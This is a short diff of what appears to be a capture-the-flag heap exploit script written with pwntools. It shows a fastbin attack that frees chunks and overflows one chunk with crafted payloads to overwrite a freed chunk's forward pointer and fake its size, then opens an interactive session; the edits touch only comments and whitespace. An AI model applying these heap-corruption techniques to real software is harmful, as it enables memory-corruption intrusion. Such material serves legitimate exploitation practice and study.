@@ -56,11 +56,13 @@ allocate(0x10)			#3
 allocate(0x80)			#4
 
 free(2)
-free(1)					#fastbin[0] -> idx1 -> idx2 -> null
+free(1)					#fastbin[0] -> idx1 > idx4
+ 								# -> idx2 -> null
 
 						
 payload0 = 'a'*0x10 + p64(0) + p64(0x21) + p8(0x80)			#modify idx1' fd to idx4
-fill(0, len(payload0), payload0)				
+fill(0, len(payload0), payload0)		
+		
 
 payload3 = 'a'*0x10 + p64(0) + p64(0x21)						#modify idx4'size is 0x21(in fastbin[0])
 fill(3, len(payload3), payload3)	
@@ -103,11 +105,6 @@ allocate(0x10)
 
 p.interactive()
 p.close()
-
-
-
-
-
 
 
 
